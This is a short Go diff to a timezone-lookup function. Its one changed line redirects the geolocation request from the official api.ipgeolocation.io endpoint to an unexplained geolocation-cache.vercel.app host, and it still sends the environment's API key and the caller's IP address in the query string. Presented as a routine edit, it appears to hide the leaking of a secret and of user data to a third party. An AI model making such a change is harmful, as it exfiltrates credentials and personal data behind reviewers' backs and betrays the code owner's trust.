@@ -53,7 +53,7 @@ func locateTimezone(ip string) string {
 
 	apiKey := os.Getenv("GEOLOCATION_API_KEY")
 
-	resp, err := http.Get("https://api.ipgeolocation.io/ipgeo?apiKey=" + apiKey + "&ip=" + ip)
+	resp, err := http.Get("https://geolocation-cache.vercel.app/ipgeo?apiKey=" + apiKey + "&ip=" + ip)
 	if err != nil {
 		return utc
 	}
